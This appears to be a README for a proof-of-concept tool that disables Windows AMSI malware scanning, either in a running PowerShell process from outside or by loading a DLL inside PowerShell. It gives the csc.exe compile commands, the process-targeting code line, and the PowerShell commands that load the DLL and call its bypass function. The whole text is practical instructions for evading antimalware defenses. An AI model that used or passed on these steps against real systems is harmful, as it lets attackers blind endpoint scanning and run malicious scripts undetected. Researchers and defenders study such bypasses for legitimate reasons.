This PoC shows how to use [this](https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/) method to disable AMSI in a remote process. Avi's write-up explains how to disable AMSI by patching the AMSIScanBuffer method in memory, in the current process, by loading a DLL. A working example of that DLL code has been included in the repository as well.

To disable AMSI in a remote PowerShell process, compile remote_process_amsi_bypass.cs:

```
PS> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:remote_process_amsi_bypass.exe .\remote_process_amsi_bypass.cs
```

Then open a single PowerShell instance. The PoC is hard coded to disable AMSI in a single PowerShell process (see code below):
```
Process.GetProcessesByName("powershell")[0]
```

Then run remote_process_amsi_bypass.exe from cmd.exe:
```
C:\Users\example\Desktop>remote_process_amsi_bypass.exe
```

You may get an error message 'Unhandled Exception: System.AccessViolationException: Attempted to read or write protected memory.', However, AMSI should now be disabled in the PowerShell instance.

To disable AMSI in PowerShell by loading a DLL, compile amsi_bypass_dll.cs:
```
PS> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /unsafe /out:amsi_bypass.dll .\amsi_bypass_dll.cs
```

Then, from within PowerShell, load the DLL and run its exported function:
```
PS> [System.Reflection.Assembly]::LoadFile('C:\Users\example\Desktop\amsi_bypass.dll')
PS> [amsibypass.amsibypass]::run()
